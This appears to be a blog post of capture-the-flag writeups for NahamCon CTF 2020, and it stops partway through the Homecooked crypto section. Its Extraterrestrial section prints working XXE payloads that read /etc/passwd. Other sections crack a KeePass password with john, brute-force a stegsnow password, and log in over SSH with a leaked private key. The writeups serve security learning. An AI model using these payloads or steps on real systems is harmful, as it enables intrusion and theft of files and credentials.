---
author: george_pick
layout: post
title: "NahamCon CTF 2020"
excerpt: "Writeups for various challenges I solved during the 2020 nahamCon CTF capture the flag competition."
categories: [Capture The Flag]
---

> NahamCon CTF
>
> June 12th 8:00 AM PDT - June 13th - 3:00 PM PDT 31-Hour Competition
>

These are writeups to challenges I solved for this CTF. I've been sorely lacking in my CTF writeups recently.

* No Castors CTF writeups
* No Defcon Quals CTF writeups
* No sharky CTF writeups
* Etc...

I find it very difficult to go back and do them after the fact... So here's to writing them as I go again!

| Web | Warmup | OSINT | Scripting | Stego | Crypto | Mobile | Misc | Forensics |
|--|--|--|--|--|--|--|--|--|
| [Agent 95](#agent-95) | [clisay](#clisay) | [Time Keeper](#time-keeper) | [Rotten](#rotten) | [Ksteg](#ksteg) | [Docxor](#docxor) | [Candroid](#candroid) | [Vortex](#vortex) | [Microsooft](#microsooft) |
| [Localghost](#localghost)| [metameme](#metameme) | [New Years Resolution](#new-years-resolution) | [Merriam Webster](#merriam-webster) | [Doh](#doh) | [Homecooked](#homecooked) | | [Fake File](#fake-file) | |
| [Extraterrestrial](#extraterrestrial)| [Mr Robot](#mr-robot) | [finsta](#finsta) | [Really Powerful Gnomes](#really-powerful-gnomes) | [Snowflakes](#snowflakes) | [Twinning](#twinning) | | [Alkatraz](#alkatraz) | |
| | [UGGC](#uggc) | [Tron](#tron) | [Big Bird](#big-bird) | [Old School](#old-school) | [Ooo-la-la](#ooo-la-la) | | [Trapped](#trapped) | |
| | [Easy Keesy](#easy-keesy) | | | | [December](#december) | | | |
| | [pang](#pang) | | | | [Raspberry](#raspberry) | | | |
|---

# Solved

# Web
## Agent 95
> They've given you a number, and taken away your name~
>
> Connect here:
> http://jh2i.com:50000

Web page looks like so:

&nbsp;
![]({{ site.baseurl }}/img/nahamConCTF2020/agent95.png){:height="70%" width="60%"}
&nbsp;

> We will only give our flag to our Agent 95! He is still running an old version of Windows...

So seems like we need to change the user-agent string in our request maybe?

Fire up burp, turn on intercept, and reload the page.

Googling for "Windows 95 user agent" leads us to [this page](https://developers.whatismybrowser.com/useragents/parse/2520-internet-explorer-windows-trident), which has an example user agent:

> Mozilla/4.0 (compatible; MSIE 5.5; Windows 95; BCD2000)

which parses to

> Internet Explorer 5.5 on Windows 95

In our burp intercept window, paste that Mozilla... string as our user agent and the page loads with our flag in plaintext this time!

Flag is `flag{user_agents_undercover}`.
&nbsp;
&nbsp;

## Localghost
> BooOooOooOOoo! This spooOoOooky client-side cooOoOode sure is scary! What spoOoOoOoky secrets does he have in stooOoOoOore??
>
> Connect here:
> http://jh2i.com:50003  
> Note, this flag is not in the usual format.

Web page looks like:

&nbsp;
![]({{ site.baseurl }}/img/nahamConCTF2020/localghost.png){:height="60%" width="60%"}
&nbsp;

If we scroll down, there seems to be an infinite stream of ascii ghosts.

&nbsp;
![]({{ site.baseurl }}/img/nahamConCTF2020/localghost.gif){:height="60%" width="60%"}
&nbsp;

(my teamate solved this one) If you inspect the Local storage in the developer tools, you'll end up seeing the flag.

&nbsp;
![]({{ site.baseurl }}/img/nahamConCTF2020/ghost_flag.png){:height="60%" width="60%"}
&nbsp;

Flag is `JCTF{spoooooky_ghosts_in_storage}`.

&nbsp;
&nbsp;


## Extraterrestrial
> Have you seen any aliens lately? Let us know!
>
> The flag is at the start of the solar system.

Web page looks like so:

&nbsp;
![]({{ site.baseurl }}/img/nahamConCTF2020/xxe_home.png){:height="60%" width="60%"}
&nbsp;

The name of the challenge seems to hint that [maybe we can get XXE](https://bookgin.tw/2018/12/04/from-xxe-to-rce-pwn2win-ctf-2018-writeup/) so I'll try a test payload:

{% highlight xml %}
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<message>
<id></id>
<message>&xxe;</message>
<title>xml</title>
</message>
{% endhighlight %}

Which works!

&nbsp;
![]({{ site.baseurl }}/img/nahamConCTF2020/xxe_pwd.png){:height="60%" width="60%"}
&nbsp;

So now we just need to figure out where that flag is... The hint says it's "at the start of the universe" so originally I was thinking it was under some time of big bang directory; but then I thought it was simpler than that:

The start of the solar system is the very first thing, before everything... Which sounds like `/`! I guessed `/flag.txt` and was right!

{% highlight xml %}
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag.txt">]>
<message>
<id></id>
<message>&xxe;</message>
<title>xml</title>
</message>
{% endhighlight %}

gives:

&nbsp;
![]({{ site.baseurl }}/img/nahamConCTF2020/xxe_flag.png){:height="60%" width="60%"}
&nbsp;

Flag is `flag{extraterrestrial_extra_entities}`.

&nbsp;
&nbsp;

# Warmup
## clisay

Fire up `clisay` binary in cutter. Search strings for `flag`.

See reference to one string for `flag{Y0u_c4n_` and then a few lines below it the remainder of the flag.

Flag is `flag{Y0u_c4n_r3Ad_M1nd5}`

&nbsp;
&nbsp;

## Metameme
Use strings on the image and grep for `flag`.

```
strings hackermeme.jpg| grep flag
    <rdf:li>flag{N0t_7h3_4cTuaL_Cr3At0r}</rdf:li>
```

Flag is `flag{N0t_7h3_4cTuaL_Cr3At0r}`.

&nbsp;
&nbsp;


## Mr Robot

Navigate to the given web page. Visit `/robots.txt`.

Flag is `flag{welcome_to_robots.txt}`

&nbsp;
&nbsp;

## UGGC
> Beat the admin!

Log in to the webpage. Register as user admin. See message that it is taken already.

Inspect cookie and see that our `admin` name gets ROT13'ed to `nqzva`. Change the `admin` name to `nqzva` and reload to get flag.

Flag is `flag{H4cK_aLL_7H3_C0okI3s}`.

&nbsp;
&nbsp;

## Easy Keesy
> Dang it, not again...

Download the given file. It looks to be a keepass password data base:

```
file easy_keesy
easy_keesy: Keepass password database 2.x KDBX
```

We can use johntheripper to pull out the password that is protecting the data base like so:

```
keepass2john easy_keesy > keepasshash
```

And then crack it like so:

```
john -format:keepass --wordlist=../rockyou.txt ziphash
```

Password is found in a few seconds on my shitty laptop as `monkeys`.

I downloaded a [OSX compatible application to open keepass dbs](https://macpassapp.org/) and entered the password. Flag was the only entry in their, whose value was the flag.

Flag is `flag{jtr_found_the_keys_to_kingdom}`

&nbsp;
&nbsp;

## pang
> The file does not open??

We're given a "png" file:

```
file pang
pang: PNG image data, 1567 x 70, 8-bit grayscale, non-interlaced
```

`pngcheck` on the file shows there's issues computing the expected CRC hash.

Run it through [PCRT](https://github.com/sherlly/PCRT) to fix and get the flag.

```
python2 PCRT.py -i pang
```

Say yes to all.

Flag is `flag{wham_bam_thank_you_for_the_flag_maam}`.

&nbsp;
&nbsp;

# OSINT
## Time Keeper
> There is some interesting stuff on this website. Or at least, I thought there was...

> Connect here: https://apporima.com/

Description hints pretty hard at wayback machine.

There is an [entry for April 18th 2020](https://web.archive.org/web/20200418214642/https://apporima.com/).

In there, the first paragraph says:

> Today, I created my first CTF challenge. The flag can be found at forward slash flag dot txt.

So, [we go there and get the flag.](https://web.archive.org/web/20200418213402/https://apporima.com/flag.txt)

Flag is `JCTF{the_wayback_machine}`.

&nbsp;
&nbsp;

## New Years Resolution
> This year, I resolve to not use old and deprecated nameserver technologies!
>
> There is nothing running on port 80. This is an OSINT challenge.
>
> Connect here: jh2i.com

Hints pretty hard at name resolution.

If we try a nslookup:

{% highlight bash %}
nslookup jh2i.com
Server:		192.168.1.1
Address:	192.168.1.1#53

Non-authoritative answer:
Name:	jh2i.com
Address: 161.35.252.71
{% endhighlight %}

We see we can a non-authoritative answer from `192.168.1.1`. If we try a `dig` command against that server:
* (I write this as if I did it right away, it took me up until 5 minutes before the CTF ended to think to try the `ANY` flag, which is the crucial part :) )

{% highlight bash %}
dig ANY jh2i.com 192.168.1.1

; <<>> DiG 9.10.6 <<>> ANY jh2i.com 192.168.1.1
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 21009
;; flags: qr rd ra; QUERY: 1, ANSWER: 7, AUTHORITY: 0, ADDITIONAL: 6

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 512
;; QUESTION SECTION:
;jh2i.com.			IN	ANY

;; ANSWER SECTION:
jh2i.com.		21600	IN	NS	ns-cloud-a2.googledomains.com.
jh2i.com.		21600	IN	NS	ns-cloud-a3.googledomains.com.
jh2i.com.		21600	IN	NS	ns-cloud-a4.googledomains.com.
jh2i.com.		21600	IN	NS	ns-cloud-a1.googledomains.com.
jh2i.com.		21600	IN	SOA	ns-cloud-a1.googledomains.com. cloud-dns-hostmaster.google.com. 48 21600 3600 259200 300
jh2i.com.		3600	IN	A	161.35.252.71
jh2i.com.		3600	IN	SPF	"flag{next_year_i_wont_use_spf}"

;; ADDITIONAL SECTION:
ns-cloud-a1.googledomains.com. 210524 IN A	216.239.32.106
ns-cloud-a1.googledomains.com. 212263 IN AAAA	2001:4860:4802:32::6a
ns-cloud-a2.googledomains.com. 210524 IN A	216.239.34.106
ns-cloud-a3.googledomains.com. 210527 IN A	216.239.36.106
ns-cloud-a4.googledomains.com. 210522 IN A	216.239.38.106

;; Query time: 44 msec
;; SERVER: 192.168.1.1#53(192.168.1.1)
;; WHEN: Sat Jun 13 17:51:36 EDT 2020
;; MSG SIZE  rcvd: 370

;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: FORMERR, id: 24649
;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 0

;; WARNING: EDNS query returned status FORMERR - retry with '+noedns'

;; QUESTION SECTION:
;192.168.1.1.			IN	ANY

;; Query time: 18 msec
;; SERVER: 192.168.1.1#53(192.168.1.1)
;; WHEN: Sat Jun 13 17:51:36 EDT 2020
;; MSG SIZE  rcvd: 29
{% endhighlight %}

Bingo. Flag is `flag{next_year_i_wont_use_spf}`.

&nbsp;
&nbsp;

## finsta
> This time we have a username. Can you track down NahamConTron?

Go to [OSINT framework](https://osintframework.com/) toolbox and use [namechk](https://namechk.com/) on the user.

Trying the [Instagram page](https://www.instagram.com/NahamConTron/), we get the flag in the bio.

Flag is `flag{i_feel_like_that_was_too_easy}`.

&nbsp;
&nbsp;

## Tron
> NahamConTron is up to more shenanigans. Find his server.

Again, go to [OSINT framework](https://osintframework.com/) toolbox and use [namechk](https://namechk.com/) on the user.

On their [github page](https://github.com/NahamConTron/dotfiles), we see a dot file repo with a `.bash_history` that shows an SSH command:

```
ssh -i config/id_rsa nahamcontron@jh2i.com -p 50033
```

And hot damn, a whole `id_rsa` also checked in. Download the repo:

{% highlight bash %}
git@github.com:NahamConTron/dotfiles.git
cd dotfiles
{% endhighlight %}

And run the same SSH command.

{% highlight bash %}
ssh -i config/id_rsa nahamcontron@jh2i.com -p 50033
{% endhighlight %}

We see the `id_rsa` has bad permissions:

{% highlight bash %}
Permissions 0644 for 'config/id_rsa' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "config/id_rsa": bad permissions
nahamcontron@jh2i.com's password:
{% endhighlight %}

So just `chmod 600 id_rsa` and then retry and we connect and can cat the `flag.txt` on the server.

Flag is `flag{nahamcontron_is_on_the_grid}`.

&nbsp;
&nbsp;

# Scripting

## Rotten
> Ick, this salad doesn't taste too good!

Connecting to the given remote endpoint, we see we are greeted with some text to echo back. The next round, we get some ROT13 text that we need to rotate and then send back. After rotating, the text may either:
* give an index and the character at that index
* say no flag here, just filler

Either way, we send it back when decoded. However, for the flag we only care about the first bullet.

I made a list of a size I thought was _plenty_ large enough, and then just iterated through rounds indefinitely until the whole flag was discovered. The script I used:

{% highlight python %}
#!/usr/bin/env python3
from pwn import *

# https://eddmann.com/posts/implementing-rot13-and-rot-n-caesar-ciphers-in-python/
def rot_alpha(n):
    from string import ascii_lowercase as lc, ascii_uppercase as uc
    lookup = str.maketrans(lc + uc, lc[n:] + lc[:n] + uc[n:] + uc[:n])
    return lambda s: s.translate(lookup)


r = remote('jh2i.com', 50034)
flag = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
flag = list(flag)

sendthisback = r.recvline().decode().strip()
r.sendline(sendthisback)

i = 0
while 1<2:
    if i % 25 == 0:
        print(''.join(flag))

    to_rot = r.recvline().decode().strip()

    for i in range(26):
        decoded = rot_alpha(-i)(to_rot)
        if decoded.startswith("send back this line exactly."):
            if "no flag here" in decoded:
                r.sendline(decoded)
                i += 1
                break
            else:
                clue = decoded.split('exactly.')[-1]
                index = clue.split()[1]
                char = clue.split()[-1][1]
                flag[int(index)] = char
                r.sendline(decoded)
                i += 1
                break
{% endhighlight %}

Looked like so when ran (I ctrl+c'ed when the flag was discovered):

```
python rotten.py
[+] Opening connection to jh2i.com on port 50034: Done
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaa_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
flagaaoaaaoaaaaow_youa_caaaaaa}aaaaaaaaaaaaaaaaaa
flagaaoaaaoaaaaow_youa_caeaars}aaaaaaaaaaaaaaaaaa
flag{aoa_yoaakaow_youa_caesars}aaaaaaaaaaaaaaaaaa
flag{aow_yoaaknow_youa_caesars}aaaaaaaaaaaaaaaaaa
flag{aow_youaknow_youa_caesars}aaaaaaaaaaaaaaaaaa
flag{aow_youaknow_your_caesars}aaaaaaaaaaaaaaaaaa
flag{now_youaknow_your_caesars}aaaaaaaaaaaaaaaaaa
flag{now_you_know_your_caesars}aaaaaaaaaaaaaaaaaa
```

Flag is `flag{now_you_know_your_caesars}`.

&nbsp;
&nbsp;

## Merriam Webster
> The infamous English dictionary producer wants to hire you! Show them you know your stuff.

Connecting to the remote endpoint, we get a list of words and need to say how many are fake:

```
nc jh2i.com 50012
: Can you tell me how many words here are NOT real words?
awlmlph bewaring jnael tfmrsq rehxfv ivdqxse ludtzwo mocngzo souped zvdwb toyed sharing onsets hddwib qnrzfaq
> 0
WRONG! YOU'RE FIRED!
```

and

```
nc jh2i.com 50012
: Can you tell me how many words here are NOT real words?
gluttons ironclad trained scimitar guano adjudge impaling stout tactless primers sharpen dryers spots xlgcq scaring gsgsk smidgen bakes
> 2
That's right!
: Can you tell me which words here are NOT real words IN CHRONOLOGICAL ORDER? Separate each by a space.
ylstgp anfwwe sissies raindrop kismu nymphs toqwy newcbep sgrpa pgbzs xszpfd pefhhq unusable khrvls busby
>
```

I downloaded [this version of the Webster's unabridged dictionary](https://github.com/matthewreagan/WebstersEnglishDictionary) and used the `dictionary.json` file for my wordlist.

But first...
1. "real words" <-- what the hell does this mean?

This is more of a pain in the ass than the various wordings of the challenge rounds for this one. I had a hard time figuring out what "**_a real word_**" means (haha, no, it's not something in the dictionary, duh!)

At the end of the day, I ended up trying a couple methods to determine a "valid" word.
* [This list of 466k english words](https://github.com/dwyl/english-words)
* [pyenchant library](https://pypi.org/project/pyenchant/)
* ~~nltk corpus~~ _waay_ too slow

The other issue is that you have no idea how many rounds (like usual) the challenge is. So once you beat it once, you need to do it again but look for the flag after the last round.

{% highlight python %}
#!/usr/bin/env python3

from pwn import *
import json

# pip install pattern
import pattern
from pattern.en import lemma, lexeme

import enchant
enchant_dict = enchant.Dict("en_US")

from nltk.corpus import words as nltk_words

#context.log_level = "debug"

r = remote('jh2i.com', 50012)

with open('english-words/words_dictionary.json', 'r') as infile:
    dictionary = json.load(infile)

for round_ in range(500):
    fake = 0
    fake_words = []
    # Can you tell me which words here are NOT real words IN CHRONOLOGICAL ORDER? Separate each by a space
    # Can you tell me which words here ARE real words IN CHRONOLOGICAL ORDER? Separate each by a space
    # Can you tell me which words here are NOT real words IN ALPHABETICAL ORDER? Separate each by a space
    # Can you tell me which words here ARE real words IN ALPHABETICAL ORDER? Separate each by a space.
    # Can you tell me how many words here ARE real words
    # Can you tell me how many words here are NOT real words
    chall = r.recvline().decode().strip()
    words = r.recvline().decode().strip().split()
    for word in words:
        valid = False
        if word in dictionary: valid = True
        if enchant_dict.check(word): valid = True
        #if word in nltk_words.words(): valid = True
        try:
            if "".join([lemma(word)]) in dictionary: valid = True
        except RuntimeError:
            if "".join([lemma(word)]) in dictionary: valid = True

        if not valid:
            #print("FAKE: ", word)
            fake_words.append(word)
            fake += 1

    #print("CHAL: ", chall)
    if "CHRONOLOGICAL ORDER" in chall:
        if "NOT" in chall:
            r.sendline(" ".join(fake_words).strip())
        else:
            r.sendline(" ".join([word for word in words if word not in fake_words]).strip())

    elif "ALPHABETICAL ORDER" in chall:
        if "NOT" in chall:
            r.sendline(" ".join(sorted(fake_words)).strip())
        else:
            r.sendline(" ".join(sorted([word for word in words if word not in fake_words])).strip())

    elif "ARE real words" in chall:
        r.sendline(str(len(words) - fake))
    else:
        r.sendline(str(fake))

    print(round_)
    if round_ == 499:
        print(r.stream())
    else:
        r.recvline() # correct!
{% endhighlight %}

I ended up just running the above in a `while true` loop until it happened to make it through all 500 rounds again.

{% highlight bash %}
while true; do python merriam_webster.py; done
{%endhighlight %}

After about 20 minutes, it made it all the way through again.

Flag is `flag{you_know_the_dictionary_so_you_are_hired}`.

&nbsp;
&nbsp;

## Really Powerful Gnomes
> Only YOU can save the village!

Connecting to the endpoint, we see it's a game where we have to progress through a set of "levels" in order to be able to beat the boss (Gnomes).

```
Welcome to Newlandia!!!
Unfortunately, the villagers have become attacked by gnomes.

They need YOU to help take back their land!



What would you like to do?
Gold: 100
Weapon level: 0

1. Defeat the gnomes (level 10)
2. Fight a dragon (level 7)
3. Raid the cyclops (level 5)
4. Plunder the pirates (level 3)
5. Go on a journey (level 1)
6. Browse the shop
7. End journey

>
```

We start off with 100 coins, which is just enough to buy the sword (level 1). We can go on the first level, which is the journey option:

```
...
> 6

Gold: 100
Weapon level: 0

1. sword (100 gold) (level 1)
2. bow (1000 gold) (level 3)
3. axe (2000 gold) (level 5)
4. missle launcher (10000 gold) (level 7)
5. tank (100000 gold) (level 10)

What would you like to buy? (press 0 to exit the shop): 1

sword bought

What would you like to do?
Gold: 0
Weapon level: 1

1. Defeat the gnomes (level 10)
2. Fight a dragon (level 7)
3. Raid the cyclops (level 5)
4. Plunder the pirates (level 3)
5. Go on a journey (level 1)
6. Browse the shop
7. End journey

> 5

Congrats you have returned from your journey with 2 gold

What would you like to do?
Gold: 2
Weapon level: 1

1. Defeat the gnomes (level 10)
2. Fight a dragon (level 7)
3. Raid the cyclops (level 5)
4. Plunder the pirates (level 3)
5. Go on a journey (level 1)
6. Browse the shop
7. End journey

>
```

So, we can keep repeating this quest until we have 1000 coins, at which point we can go buy the level 3 bow. Then back to more grinding (this time the higher quest vs the pirates).

Rinse and repeat until we can buy the tank and wreck those Gnomes' shit.

{% highlight python %}
#!/usr/bin/env python3

#1. Defeat the gnomes (level 10)
#2. Fight a dragon (level 7)
#3. Raid the cyclops (level 5)
#4. Plunder the pirates (level 3)
#5. Go on a journey (level 1)
#6. Browse the shop
#    1. sword (100 gold) (level 1)
#    2. bow (1000 gold) (level 3)
#    3. axe (2000 gold) (level 5)
#    4. missle launcher (10000 gold) (level 7)
#    5. tank (100000 gold) (level 10)
#7. End journey

from pwn import *
#context.log_level = "debug"

r = remote('jh2i.com', 50031)

def get_level_get_gold_next(buy_level, journey, amount):
    # Get level buy_level
    output = r.recvuntil('> ').decode().strip()
    r.sendline("6")
    output = r.recvuntil('exit the shop): ').decode().strip()
    r.sendline(buy_level)

    output = r.recvuntil('> ').decode().strip()
    r.sendline(journey)

    # Get gold till levelX
    gold_amt = 0
    while gold_amt < amount:
        output = r.recvuntil('> ').decode().strip()
        r.sendline(journey)
        gold = output.split()[16]
        gold_amt = int(output.split()[17])

get_level_get_gold_next("1", "5", 1000)
get_level_get_gold_next("2", "4", 2000)
get_level_get_gold_next("3", "3", 10000)
get_level_get_gold_next("4", "2", 100000)


output = r.recvuntil('> ').decode().strip()
r.sendline("6")
output = r.recvuntil('exit the shop): ').decode().strip()
# buy the tank
r.sendline("5")
output = r.recvuntil('> ').decode().strip()
# fuck those gnomes
r.sendline("1")
# get flag
print(r.stream())
{% endhighlight %}

Flag is `flag{it_was_in_fact_you_that_was_really_powerful}`.

&nbsp;
&nbsp;

## Big Bird
> Big Bird is communicating with us in a whole new way! But... how?
>
> Connect here: https://twitter.com/BigBird01558595

Ok, so we see a twitter account that's posted a bunch of `"Tweet #XXXX <number>"`:


&nbsp;
![]({{ site.baseurl }}/img/nahamConCTF2020/bigbird.png)
&nbsp;

I looked around for Twitter account scrappers that didn't need a Twitter account login/authorization and happened to find [GetOldTweets3](https://pypi.org/project/GetOldTweets3/).

After installing, I downloaded all of the tweets for the user like so:

{% highlight bash %}
GetOldTweets3 --username "BigBird01558595" --maxtweets 1000
Downloading tweets...
Saved 402
Done. Output file generated "output_got.csv".
{% endhighlight %}

OK, so there are only 402 tweets. That output file looks something like so:

```
date,username,to,replies,retweets,favorites,text,geo,mentions,hashtags,id,permalink
2020-05-31 00:11:44,BigBird01558595,,0,0,0,"Tweet #168 12",,,,1266885032754515968,https://twitter.com/BigBird01558595/status/1266885032754515968
2020-05-31 00:10:41,BigBird01558595,,0,0,0,"Tweet #274 72",,,,1266884770623078400,https://twitter.com/BigBird01558595/status/1266884770623078400
2020-05-31 00:09:40,BigBird01558595,,0,0,0,"Tweet #23 111",,,,1266884512681779212,https://twitter.com/BigBird01558595/status/1266884512681779212
2020-05-31 00:08:38,BigBird01558595,,0,0,0,"Tweet #376 63",,,,1266884254790750208,https://twitter.com/BigBird01558595/status/1266884254790750208
2020-05-31 00:07:37,BigBird01558595,,0,0,0,"Tweet #333 202",,,,1266883996862091264,https://twitter.com/BigBird01558595/status/1266883996862091264
2020-05-31 00:06:35,BigBird01558595,,0,0,0,"Tweet #58 83",,,,1266883738362937344,https://twitter.com/BigBird01558595/status/1266883738362937344
2020-05-31 00:05:33,BigBird01558595,,0,0,0,"Tweet #282 88",,,,1266883480023162882,https://twitter.com/BigBird01558595/status/1266883480023162882
2020-05-31 00:04:32,BigBird01558595,,0,0,0,"Tweet #375 226",,,,1266883222132178944,https://twitter.com/BigBird01558595/status/1266883222132178944
2020-05-31 00:03:30,BigBird01558595,,0,0,0,"Tweet #225 38",,,,1266882964467732486,https://twitter.com/BigBird01558595/status/1266882964467732486
...
```

I assume we're interested in the `"Tweet #XXX <num>` bit. Likely sorted from Tweet 1 to Tweet 402.

To get just the tweet information:

{% highlight bash %}
cat output_got.csv | sed 's/,/\t/g' | awk -F$'\t' '{print $7}' |  sed 's/"//g'
Tweet #168 12
Tweet #274 72
Tweet #23 111
Tweet #376 63
...
{% endhighlight %}

I dumped that to a new file then opened it up in Python. I assumed the Tweet # meant we needed to sort them from oldest (tweet #0) to newest:

{% highlight python %}
with open('big_bird_tweets.txt', 'r') as infile:
    tweets = infile.readlines()

tweets.sort(key = lambda x: int(x.split()[1][1:]))
{% endhighlight %}

This gives us the following:

```
Tweet #0 137
Tweet #1 80
Tweet #2 78
Tweet #3 71
Tweet #4 13
Tweet #5 10
Tweet #6 26
Tweet #7 10
Tweet #8 0
Tweet #9 0
Tweet #10 0
Tweet #11 13
Tweet #12 73
Tweet #13 72
Tweet #14 68
Tweet #15 82
Tweet #16 0
...
```

I stared at this a _long_ while before realing what it was: Hex code for a PNG image.

This required you to:
1. Convert the tweet's decimal number value to hex
2. Left pad the resultant hex with a 0 if it was a single hex digit.

Doing so, for example, yields:

```
Tweet #0 89
Tweet #1 50
Tweet #2 4e
Tweet #3 47
Tweet #4 0d
Tweet #5 0a
Tweet #6 1a
Tweet #7 0a
Tweet #8 00
Tweet #9 00
...
```

Which - [definitely matches the signature bytes of a PNG](https://en.wikipedia.org/wiki/List_of_file_signatures).

We can convert the hex to binary and then save as an image.

{% highlight python %}
#!/usr/bin/env python3
import binascii

with open('big_bird_tweets.txt', 'r') as infile:
    tweets = infile.readlines()

tweets.sort(key = lambda x: int(x.split()[1][1:]))
flag = ""
for tweet in tweets:
    hex_ = hex(int(tweet.strip().split()[-1]))[2:]

    if len(hex_) == 2:
        flag += hex_
    else:
        flag += "0" + hex_

data = binascii.a2b_hex(flag)
with open('image.png', 'wb') as file:
    file.write(data)
{% endhighlight %}

The generated image is a QR code.

&nbsp;
![]({{ site.baseurl }}/img/nahamConCTF2020/bird_qr.png)
&nbsp;

Plug the resultant QR code into an [online reader](https://online-barcode-reader.inliteresearch.com/) to get the flag.

Flag is `flag{big_bird_tweets_big_tweets}`.

&nbsp;
&nbsp;

# Steganography
## Ksteg
> This must be a typo.... it was kust one letter away

`jsteg reveal` the given file.

Flag is `flag{yeast_bit_steganography_oops_another_typo}`.

&nbsp;
&nbsp;

## Doh
> Doh! Stupid steganography...
>
> Note, this flag is not in the usual format.
>
> Download the file below.

Running the file through `check_jpg.sh` from [the stego toolkit container](https://github.com/DominicBreuker/stego-toolkit) we see steghide wrote results to a `flag.txt` file.

Cat it for the flag.

Flag is `JCTF{an_annoyed_grunt}`.

&nbsp;
&nbsp;

## Snowflakes
> Frosty the Snowman is just made up of a lot of snowflakes. Which is the right one?

We're given a file that has a bunch of weird whitespace:

&nbsp;
![]({{ site.baseurl }}/img/nahamConCTF2020/snowflakes.png)
&nbsp;

Given the context of the challenge, it seems like we need to use [stegsnow](http://manpages.ubuntu.com/manpages/bionic/man1/stegsnow.1.html) to recover the flag from the encrypted whitespace message.

Just running `stegsnow -C` on the file results in garbage, so I figured I'd try passwords. I just looped through a bunch of the entries in `rockyou.txt` until I found what seemed like valid flag text

At first, I "grepped" for `{` and `}`. This lead to things that had braces, but still where mostly junk.

But, I did notice that a consistent chunk of text was appearing: `_spinning_snowflake}`. That looks more like a flag! I updated my "grep" for that and let it run again.

{% highlight python %}
import os
import time

file1 = open("rockyou.txt","r", encoding='latin-1')
passwds = file1.readlines()

for i in passwds:
    i = i.replace("\n", "")
    cmd = "stegsnow -C -p '{}' frostythesnowman.txt".format(i)
    try:
        result = os.popen(cmd).read()
    except UnicodeDecodeError:
        pass
    if "spinning_snowflake" in str(result):
        print(result)
        print("WORD: ", i)
        time.sleep(5)
{% endhighlight %}

The password ended up being `ilovejohn` (can try again by hand):

```
stegsnow -C -p 'ilovejohn' frostythesnowman.txt
JCTF{gemmy_spinning_snowflake}
```

Flag is `JCTF{gemmy_spinning_snowflake}`

&nbsp;
&nbsp;

## Old School
> Did Dade Murphy do this?

We're given a `.bmp` image file:

```
file hackers.bmp
hackers.bmp: PC bitmap, Windows 3.x format, 480 x 360 x 24
```

It looks fine visually.
* `zsteg` returns one useless hit then nothing.
* `zsteg -a` returns some junk, and then the flag in `b1,bgr,lsb,xy`:

```
b1,bgr,lsb,xy       .. text: "4JCTF{at_least_the_movie_is_older_than_this_software}"
```

Flag is `JCTF{at_least_the_movie_is_older_than_this_software}`

&nbsp;
&nbsp;

# Crypto
## Docxor
> My friend gave me a copy of his homework the other day... I think he encrypted it or something?? My computer won't open it, but he said the password is only four characters long...

We're given a file called "homework" which looks like it's clearly been encrypted.

The description tells us it's only 4 characters long, so we can use [xortool](https://github.com/hellman/xortool) with `-l 4`:

{% highlight bash %}
xortool -l 4 -c '\x00' homework
{% endhighlight %}

I used `-c '\x00'` as the most common character since I was guessing that was a pretty safe guess.

Running the xortool, we get 0 results with expected-to-be-plaintext which is sad. But, you should look at the results anyways! If you manually inspect the file, you see that there is some binary jump, but at the bottom there are clear indications of a Windows Microsoft Office type file! Convert the `0.out` file to a `flag.docx` file and then open in word and we see the document has a single string, the flag!

Flag is `flag{xor_is_not_for_security}`

&nbsp;
&nbsp;


## Homecooked
> I cannot get this to decrypt!

We're given the following file:

{% highlight python %}
import base64
num = 0
count = 0
cipher_b64 = b"MTAwLDExMSwxMDAsOTYsMTEyLDIxLDIwOSwxNjYsMjE2LDE0MCwzMzAsMzE4LDMyMSw3MDIyMSw3MDQxNCw3MDU0NCw3MTQxNCw3MTgxMCw3MjIxMSw3MjgyNyw3MzAwMCw3MzMxOSw3MzcyMiw3NDA4OCw3NDY0Myw3NTU0MiwxMDAyOTAzLDEwMDgwOTQsMTAyMjA4OSwxMDI4MTA0LDEwMzUzMzcsMTA0MzQ0OCwxMDU1NTg3LDEwNjI1NDEsMTA2NTcxNSwxMDc0NzQ5LDEwODI4NDQsMTA4NTY5NiwxMDkyOTY2LDEwOTQwMDA="

def a(num):
    if (num > 1):
        for i in range(2,num):
            if (num % i) == 0:
                return False
                break
        return True
    else:
        return False

def b(num):
    my_str = str(num)
    rev_str = reversed(my_str)
    if list(my_str) == list(rev_str):
       return True
    else:
       return False


cipher = base64.b64decode(cipher_b64).decode().split(",")

while(count < len(cipher)):
    if (a(num)):
        if (b(num)):
            print(chr(int(cipher[count]) ^ num), end='', flush=True)
            print(num)
            count += 1
            if (count == 13):
                num = 50000
            if (count == 26):
                num = 500000
    else:
        pass
    num+=1

print()
{% endhighlight %}

So, it looks like it has some base64 encoded data that it will properly decoded/un XOR if we satisfy two constraints with our `num`.
* `a(num)`
* `b(num)`.

Before I looked further, I decided to run it to see what happens:

```
python ../decrypt.py
flag{pR1m3s_4
```

And then it just hangs there for a bit, then goes to

```
flag{pR1m3s_4re_co0ler_Wh3
```

And again waits. So we can imagine at least one of those `a` or `b` functions is generating some sort of constraint checked prime. Looking at those functions, we first need to satisfy `a(num)`. Looking at `a()`, we see all it is is a basic "is this number prime" check (albeit a really shitty and slow one).

It checks to make sure that no number between 2 and `num` evenly divises the `num`. If it does, it returns False because a prime number is only divisible by itself and 1.

Looking at `b()`, we see it takes our argument and converts it to a string. It checks if the given number as a string matches itself reversed (i.e. a [palindrome](https://www.dictionary.com/browse/palindrome)) and that a list conversion of our number string matches the reversed number string.

A good way to see that this is happening is just add a `print(num)` to the logic right after the successful XOR print. Doing so, you'll see:

```
f2
l3
a5
g7
{11
p101
R131
1151
m181
3191
s313
_353
4373
```

